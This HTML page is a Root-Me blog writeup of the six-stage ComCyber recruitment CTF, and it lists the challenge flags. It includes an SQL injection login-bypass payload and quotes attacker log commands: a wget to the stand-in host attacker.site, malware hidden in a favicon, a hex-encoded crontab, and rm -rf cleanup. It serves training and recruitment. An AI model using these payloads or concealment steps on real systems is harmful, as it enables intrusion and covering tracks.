<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Writeup - ComCyber Recrutement CTF - Root-Me Blog</title><meta name="Description" content="Root Me allows everyone to test and improve their knowledge in computer security and hacking. Legal. Free. Realistic."><meta property="og:title" content="Writeup - ComCyber Recrutement CTF" />
<meta property="og:description" content="Solution of the recruitment CTF of ComCyber during September 2024" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://blog.root-me.org/posts/writeup_comcyber/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2024-09-30T00:00:00+00:00" />
<meta property="article:modified_time" content="2024-09-30T00:00:00+00:00" /><meta property="og:site_name" content="Root-Me Blog" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Writeup - ComCyber Recrutement CTF"/>
<meta name="twitter:description" content="Solution of the recruitment CTF of ComCyber during September 2024"/>
<meta name="application-name" content="Root-Me Blog">
<meta name="apple-mobile-web-app-title" content="Root-Me Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.root-me.org/posts/writeup_comcyber/" /><link rel="prev" href="https://blog.root-me.org/posts/10_commandments_solution/" /><link rel="next" href="https://blog.root-me.org/posts/writeup_snippet_01/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Writeup - ComCyber Recrutement CTF",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "https:\/\/blog.root-me.org\/posts\/writeup_comcyber\/"
        },"genre": "posts","keywords": "comcyber, writeup, solution","wordcount":  1066 ,
        "url": "https:\/\/blog.root-me.org\/posts\/writeup_comcyber\/","datePublished": "2024-09-30T00:00:00+00:00","dateModified": "2024-09-30T00:00:00+00:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "Nishacid"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('light' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'light' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Root-Me Blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="https://www.root-me.org/IMG/logo/siteon0.svg"
        data-srcset="https://www.root-me.org/IMG/logo/siteon0.svg, https://www.root-me.org/IMG/logo/siteon0.svg 1.5x, https://www.root-me.org/IMG/logo/siteon0.svg 2x"
        data-sizes="auto"
        alt="https://www.root-me.org/IMG/logo/siteon0.svg"
        title="https://www.root-me.org/IMG/logo/siteon0.svg" />Root-Me Blog</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Root-Me Blog"><img
        class="lazyload logo"
        src="/svg/loading.min.svg"
        data-src="https://www.root-me.org/IMG/logo/siteon0.svg"
        data-srcset="https://www.root-me.org/IMG/logo/siteon0.svg, https://www.root-me.org/IMG/logo/siteon0.svg 1.5x, https://www.root-me.org/IMG/logo/siteon0.svg 2x"
        data-sizes="auto"
        alt="https://www.root-me.org/IMG/logo/siteon0.svg"
        title="https://www.root-me.org/IMG/logo/siteon0.svg" />Root-Me Blog</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Writeup - ComCyber Recrutement CTF</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="https://www.root-me.org/Nishacid" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Nishacid</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeups/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Writeups</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-09-30">2024-09-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1066 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#context">Context</a></li>
    <li><a href="#introduction">Introduction</a></li>
    <li><a href="#step-1---network">Step 1 - Network</a></li>
    <li><a href="#step-2---web">Step 2 - Web</a></li>
    <li><a href="#step-3---forensic">Step 3 - Forensic</a></li>
    <li><a href="#step-4---steganography">Step 4 - Steganography</a></li>
    <li><a href="#step-5---reverse-engineering">Step 5 - Reverse Engineering</a></li>
    <li><a href="#step-6---cryptography">Step 6 - Cryptography</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h2 id="context">Context</h2>
<p>On <strong>September 2, 2024</strong>, the <a href="https://www.defense.gouv.fr/comcyber/commandement-cyberdefense-comcyber" target="_blank" rel="noopener noreffer ">Commandement de la Cyberd√©fense (ComCyber)</a> launched a unique challenge running until <strong>September 30, 2024</strong>. Created by <a href="https://pro.root-me.org/" target="_blank" rel="noopener noreffer ">Root-Me Pro</a>, it is part of ComCyber&rsquo;s recruitment campaign for cyber sous-officers.</p>
<p>This &ldquo;realistic&rdquo; challenge consists of several stages, each focusing on a specific professional domain:</p>
<ul>
<li><strong>Network</strong></li>
<li><strong>Web</strong></li>
<li><strong>Forensic</strong></li>
<li><strong>Steganography</strong></li>
<li><strong>Reverse Engineering</strong></li>
<li><strong>Cryptography</strong></li>
</ul>
<h2 id="introduction">Introduction</h2>
<p>The challenge begins with a homepage that introduces players to the context of the challenge, explains the objectives, and outlines the process.
This homepage can be accessed at the following address:</p>
<ul>
<li><a href="https://comcyber.challenges.pro.root-me.org/" target="_blank" rel="noopener noreffer ">https://comcyber.challenges.pro.root-me.org/</a></li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/home.png"
        data-srcset="/assets/images/writeups/comcyber/home.png, /assets/images/writeups/comcyber/home.png 1.5x, /assets/images/writeups/comcyber/home.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/home.png"
        title="comcyber_home" /></p>
<p>Players are then invited to click the &ldquo;Start Challenge&rdquo; button and fill out a form containing required and optional information.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/register.png"
        data-srcset="/assets/images/writeups/comcyber/register.png, /assets/images/writeups/comcyber/register.png 1.5x, /assets/images/writeups/comcyber/register.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/register.png"
        title="comcyber_register" /></p>
<p>Once the form is filled out, players are redirected to a new page that presents the context and objectives of the mission.
This mission aims to restore communication that has been interrupted with a vehicle.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/mission.png"
        data-srcset="/assets/images/writeups/comcyber/mission.png, /assets/images/writeups/comcyber/mission.png 1.5x, /assets/images/writeups/comcyber/mission.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/mission.png"
        title="comcyber_mission" /></p>
<h2 id="step-1---network">Step 1 - Network</h2>
<p>The first step of the challenge is to analyze a network capture using an appropriate tool (<a href="https://www.wireshark.org/" target="_blank" rel="noopener noreffer ">Wireshark</a> for example).
The <code>.pcap</code> file downloaded presents a capture of a communication using the <code>TELNET</code> protocol, which, by default, does not have any encryption. By following this communication, we can clearly read each command entered by the user on the target operating system.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/network_telnet.png"
        data-srcset="/assets/images/writeups/comcyber/network_telnet.png, /assets/images/writeups/comcyber/network_telnet.png 1.5x, /assets/images/writeups/comcyber/network_telnet.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/network_telnet.png"
        title="network telnet" /></p>
<p>We quickly observe the different system commands executed by the user, as well as a <strong>Base64 encoded string</strong> that the user inserts into the <code>/tmp/secret</code> file.</p>
<ul>
<li><code>Uk17N2FmZjJhNjA3YjEzZjczY2IwOTM2Zjk2ZTY3YjIxMDIwN2FlMDQ3NX0K</code></li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/network_flag.png"
        data-srcset="/assets/images/writeups/comcyber/network_flag.png, /assets/images/writeups/comcyber/network_flag.png 1.5x, /assets/images/writeups/comcyber/network_flag.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/network_flag.png"
        title="network secret" /></p>
<p>Once decoded, this string reveals the flag for the first step:</p>
<ul>
<li><code>RM{7aff2a607b13f73cb0936f96e67b210207ae0475}</code></li>
</ul>
<p>The next analysis confirms that the communication has been interrupted and that the TELNET port is no longer responding.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/network_lost.png"
        data-srcset="/assets/images/writeups/comcyber/network_lost.png, /assets/images/writeups/comcyber/network_lost.png 1.5x, /assets/images/writeups/comcyber/network_lost.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/network_lost.png"
        title="network lost" /></p>
<p>Then, the server receives UDP packets containing a message explaining that the communication is interrupted and that it is necessary to consult the dashboard to reactivate it.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/network_udp.png"
        data-srcset="/assets/images/writeups/comcyber/network_udp.png, /assets/images/writeups/comcyber/network_udp.png 1.5x, /assets/images/writeups/comcyber/network_udp.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/network_udp.png"
        title="network udp" /></p>
<p>We then access the dashboard, which appears to be protected by authentication.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/web_login.png"
        data-srcset="/assets/images/writeups/comcyber/web_login.png, /assets/images/writeups/comcyber/web_login.png 1.5x, /assets/images/writeups/comcyber/web_login.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/web_login.png"
        title="web login" /></p>
<h2 id="step-2---web">Step 2 - Web</h2>
<p>After a few tests, it appears that the authentication is not vulnerable to weak passwords.
However, it is indicated that the authentication returns an error when certain characters are inserted.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/web_error.png"
        data-srcset="/assets/images/writeups/comcyber/web_error.png, /assets/images/writeups/comcyber/web_error.png 1.5x, /assets/images/writeups/comcyber/web_error.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/web_error.png"
        title="web error" /></p>
<p>This suggests a SQL injection, as indicated by the error <code>Error in SQL Syntax</code>. The following payload then allows bypassing authentication by making the SQL query <em>&lsquo;valid&rsquo;</em>:</p>
<ul>
<li><code>admin' OR '1'='1' --</code></li>
</ul>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/web_bypass.png"
        data-srcset="/assets/images/writeups/comcyber/web_bypass.png, /assets/images/writeups/comcyber/web_bypass.png 1.5x, /assets/images/writeups/comcyber/web_bypass.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/web_bypass.png"
        title="web bypass" /></p>
<p>It is also possible to use <a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener noreffer ">SQLMap</a> to retrieve all the contents of the database, thus allowing the flag for the second step to be obtained:</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/web_sqlmap.png"
        data-srcset="/assets/images/writeups/comcyber/web_sqlmap.png, /assets/images/writeups/comcyber/web_sqlmap.png 1.5x, /assets/images/writeups/comcyber/web_sqlmap.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/web_sqlmap.png"
        title="web sqlmap" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/web_sqlmap_results.png"
        data-srcset="/assets/images/writeups/comcyber/web_sqlmap_results.png, /assets/images/writeups/comcyber/web_sqlmap_results.png 1.5x, /assets/images/writeups/comcyber/web_sqlmap_results.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/web_sqlmap_results.png"
        title="web sqlmap results" /></p>
<ul>
<li><code>RM{a868c4433fd2ded45624a7c8998cdfe04113b7c5}</code></li>
</ul>
<p>Once this step is completed, we are redirected to the dashboard of the communication management tool. We quickly notice that a vehicle is no longer connected to the dashboard (disconnected in red):</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/web_dashboard.png"
        data-srcset="/assets/images/writeups/comcyber/web_dashboard.png, /assets/images/writeups/comcyber/web_dashboard.png 1.5x, /assets/images/writeups/comcyber/web_dashboard.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/web_dashboard.png"
        title="web dashboard" /></p>
<h2 id="step-3---forensic">Step 3 - Forensic</h2>
<p>By exploring the application, we notice that a vehicle is disabled. We have the ability to activate it, but this requires an <strong>activation code</strong> that we do not currently possess.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/forensic_code.png"
        data-srcset="/assets/images/writeups/comcyber/forensic_code.png, /assets/images/writeups/comcyber/forensic_code.png 1.5x, /assets/images/writeups/comcyber/forensic_code.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/forensic_code.png"
        title="forensic code" /></p>
<p>It is possible to download the latest logs from the vehicle&rsquo;s operating system and begin a forensic analysis.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/forensic_logs.png"
        data-srcset="/assets/images/writeups/comcyber/forensic_logs.png, /assets/images/writeups/comcyber/forensic_logs.png 1.5x, /assets/images/writeups/comcyber/forensic_logs.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/forensic_logs.png"
        title="forensic logs" /></p>
<p>We obtain the latest logs from the vehicle&rsquo;s operating system and realize that they come from the <code>SYSLOG</code> of the machine.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/forensic_syslog.png"
        data-srcset="/assets/images/writeups/comcyber/forensic_syslog.png, /assets/images/writeups/comcyber/forensic_syslog.png 1.5x, /assets/images/writeups/comcyber/forensic_syslog.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/forensic_syslog.png"
        title="forensic syslog" /></p>
<p>It is then possible to search for the different <strong>commands executed on the machine</strong> by searching for the pattern <code>CMD</code> in the logs.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/forensic_cmd.png"
        data-srcset="/assets/images/writeups/comcyber/forensic_cmd.png, /assets/images/writeups/comcyber/forensic_cmd.png 1.5x, /assets/images/writeups/comcyber/forensic_cmd.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/forensic_cmd.png"
        title="forensic cmd" /></p>
<p>Among the commands, certain ones catch our attention, such as the following:</p>
<ul>
<li><code>echo 'efa3fb1f409aa622dddd7220ad6567580fb68b68' &gt; /tmp/.password</code></li>
<li><code>vim message.txt</code></li>
<li><code>wget -O /dev/null https://attacker.site/m4lw3r3</code></li>
<li><code>zip --password ($cat /tmp/.password) secret.zip message.txt m4lw3r3</code></li>
<li><code>cat /app/static/assets/images/favicon.ico ./secret.zip &gt; /app/static/assets/images/favicon.ico</code></li>
<li><code>echo '2a202a202a202a202a20206563686f2027524d7b393835336561303861623734373265653865663237633631363239396461663530653330626439307d270a' | xxd -r -p | crontab -</code></li>
<li><code>crontab -l</code></li>
<li><code>rm -rf ./message.txt ./secret.zip ./m4lw3r3</code></li>
<li><code>rm -rf /tmp/.password</code></li>
</ul>
<p>From these commands, we can see that an attacker has <strong>uploaded malware onto the machine</strong>, <strong>placed it in an encrypted ZIP file</strong>, and <strong>hidden this ZIP file in the favicon of the application</strong> to retrieve it later, before deleting all traces of their actions.
However, during the <strong>encryption of the ZIP</strong>, they used a <strong>password recorded in a file</strong>, which we can retrieve using the <code>echo</code> command present in the logs.
It is then possible to retrieve the favicon of the application to extract the malware.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/forensic_favicon.png"
        data-srcset="/assets/images/writeups/comcyber/forensic_favicon.png, /assets/images/writeups/comcyber/forensic_favicon.png 1.5x, /assets/images/writeups/comcyber/forensic_favicon.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/forensic_favicon.png"
        title="forensic favicon" /></p>
<p>We also find a flag encoded in <strong>hexadecimal</strong> that has been inserted into a <code>crontab</code> file.</p>
<ul>
<li><code>* * * * * echo 'RM{9853ea08ab7472ee8ef27c616299daf50e30bd90}</code></li>
<li><code>RM{9853ea08ab7472ee8ef27c616299daf50e30bd90}</code></li>
</ul>
<h2 id="step-4---steganography">Step 4 - Steganography</h2>
<p>Once the favicon has been retrieved, it is necessary to extract the encrypted archive using the <code>binwalk</code> tool.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/steganography_binwalk.png"
        data-srcset="/assets/images/writeups/comcyber/steganography_binwalk.png, /assets/images/writeups/comcyber/steganography_binwalk.png 1.5x, /assets/images/writeups/comcyber/steganography_binwalk.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/steganography_binwalk.png"
        title="stegano binwalk" /></p>
<p>We have extracted two archives, one of which is empty. The other, named <code>3C2E</code>, catches our attention as it contains the two files we had previously identified in the logs of the machine.
It is possible to extract these files using the password found in the logs.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/steganography_unzip.png"
        data-srcset="/assets/images/writeups/comcyber/steganography_unzip.png, /assets/images/writeups/comcyber/steganography_unzip.png 1.5x, /assets/images/writeups/comcyber/steganography_unzip.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/steganography_unzip.png"
        title="steganography unzip" /></p>
<p>The <code>message.txt</code> file contains the flag for the fourth step.</p>
<ul>
<li><code>RM{6ba43cb5eeab217270e9692e939da5341a82d2ff}</code></li>
</ul>
<h2 id="step-5---reverse-engineering">Step 5 - Reverse Engineering</h2>
<p>The program can be executed via the command line, but we don&rsquo;t know what inputs it expects, especially since it <strong>requires two</strong>.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/reverse_intro.png"
        data-srcset="/assets/images/writeups/comcyber/reverse_intro.png, /assets/images/writeups/comcyber/reverse_intro.png 1.5x, /assets/images/writeups/comcyber/reverse_intro.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/reverse_intro.png"
        title="reverse intro" /></p>
<p>By opening the program in a disassembler such as <a href="https://hex-rays.com/ida-free/" target="_blank" rel="noopener noreffer ">IDA Free</a> and generating a <strong>pseudo-code in C</strong>, we can observe that it concatenates three strings for comparison with the input 1.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/reverse_ida.png"
        data-srcset="/assets/images/writeups/comcyber/reverse_ida.png, /assets/images/writeups/comcyber/reverse_ida.png 1.5x, /assets/images/writeups/comcyber/reverse_ida.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/reverse_ida.png"
        title="reverse ida" /></p>
<p>By reassembling these three strings, we obtain the flag which will be used <strong>to validate the input 1</strong> of the program.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/reverse_input1.png"
        data-srcset="/assets/images/writeups/comcyber/reverse_input1.png, /assets/images/writeups/comcyber/reverse_input1.png 1.5x, /assets/images/writeups/comcyber/reverse_input1.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/reverse_input1.png"
        title="reverse input1" /></p>
<ul>
<li><code>RM{6762f71489bb7b57bbdaabd1306a677bbcf25bd7}</code></li>
</ul>
<h2 id="step-6---cryptography">Step 6 - Cryptography</h2>
<p>For this last step, we must still <strong>find the activation code</strong> of the compromised device.
We also need a second input to make the program work. By analyzing the program in more detail, we notice that if the input 2 is validated, a message appears, indicating that we are now able to decrypt a string in hexadecimal.
This suggests the presence of a cryptographic vulnerability.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/crypto_input2.png"
        data-srcset="/assets/images/writeups/comcyber/crypto_input2.png, /assets/images/writeups/comcyber/crypto_input2.png 1.5x, /assets/images/writeups/comcyber/crypto_input2.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/crypto_input2.png"
        title="crypto input2" /></p>
<p>Our hypothesis is confirmed by finding <strong>calls to cryptographic functions RSA</strong> in the assembly code, as well as the presence of the values <code>e</code> for the exponent and <code>n</code> for the module.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/crypto_functions.png"
        data-srcset="/assets/images/writeups/comcyber/crypto_functions.png, /assets/images/writeups/comcyber/crypto_functions.png 1.5x, /assets/images/writeups/comcyber/crypto_functions.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/crypto_functions.png"
        title="crypto functions" /></p>
<p>We can now retrieve the hexadecimal values of <code>e</code> and <code>n</code> by selecting them in our disassembler, then converting them to decimal as follows with python.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/crypto_python.png"
        data-srcset="/assets/images/writeups/comcyber/crypto_python.png, /assets/images/writeups/comcyber/crypto_python.png 1.5x, /assets/images/writeups/comcyber/crypto_python.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/crypto_python.png"
        title="crypto python" /></p>
<p>We notice that the exponent <code>e</code> is <strong>much too large</strong>, making the implementation vulnerable to <a href="https://en.wikipedia.org/wiki/Wiener%27s_attack" target="_blank" rel="noopener noreffer ">Wiener&rsquo;s attack</a>.
Therefore, it becomes possible to decrypt the encrypted messages, which we can do with the <a href="https://github.com/RsaCtfTool/RsaCtfTool" target="_blank" rel="noopener noreffer ">RsaCtfTool</a> tool on the previously found encrypted message, which we also convert to decimal.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/crypto_python_d.png"
        data-srcset="/assets/images/writeups/comcyber/crypto_python_d.png, /assets/images/writeups/comcyber/crypto_python_d.png 1.5x, /assets/images/writeups/comcyber/crypto_python_d.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/crypto_python_d.png"
        title="crypto python d" /></p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/crypto_rsactftool.png"
        data-srcset="/assets/images/writeups/comcyber/crypto_rsactftool.png, /assets/images/writeups/comcyber/crypto_rsactftool.png 1.5x, /assets/images/writeups/comcyber/crypto_rsactftool.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/crypto_rsactftool.png"
        title="crypto rsactftool" /></p>
<p>After successfully <strong>attacking the RSA implementation</strong>, we obtain a string of characters that appears to be the code necessary to reactivate the communication.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/crypto_activation.png"
        data-srcset="/assets/images/writeups/comcyber/crypto_activation.png, /assets/images/writeups/comcyber/crypto_activation.png 1.5x, /assets/images/writeups/comcyber/crypto_activation.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/crypto_activation.png"
        title="crypto activation" /></p>
<p>After reactivating the vehicle, we receive the final message of the challenge, as well as the last flag of this sixth step.</p>
<p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="/assets/images/writeups/comcyber/crypto_flag.png"
        data-srcset="/assets/images/writeups/comcyber/crypto_flag.png, /assets/images/writeups/comcyber/crypto_flag.png 1.5x, /assets/images/writeups/comcyber/crypto_flag.png 2x"
        data-sizes="auto"
        alt="/assets/images/writeups/comcyber/crypto_flag.png"
        title="crypto flag" /></p>
<ul>
<li><code>RM{8b5bd7dc99433e2ec980dfb03401341fb1b879d8}</code></li>
</ul>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Updated on 2024-09-30</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.root-me.org/posts/writeup_comcyber/" data-title="Writeup - ComCyber Recrutement CTF" data-via="rootme_org" data-hashtags="comcyber,writeup,solution"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.root-me.org/posts/writeup_comcyber/" data-hashtag="comcyber"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.root-me.org/posts/writeup_comcyber/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/comcyber/">comcyber</a>,&nbsp;<a href="/tags/writeup/">writeup</a>,&nbsp;<a href="/tags/solution/">solution</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/posts/10_commandments_solution/" class="prev" rel="prev" title="10 commandments of writing solution"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>10 commandments of writing solution</a>
            <a href="/posts/writeup_snippet_01/" class="next" rel="next" title="Code Snippet Serie - 01 - SQL Like injection">Code Snippet Serie - 01 - SQL Like injection<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://root-me.org" target="_blank">Root-Me</a></span>&nbsp;|&nbsp;<span class="license">contact@root-me.org | <a href='/privacy/'>Privacy</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
</html>
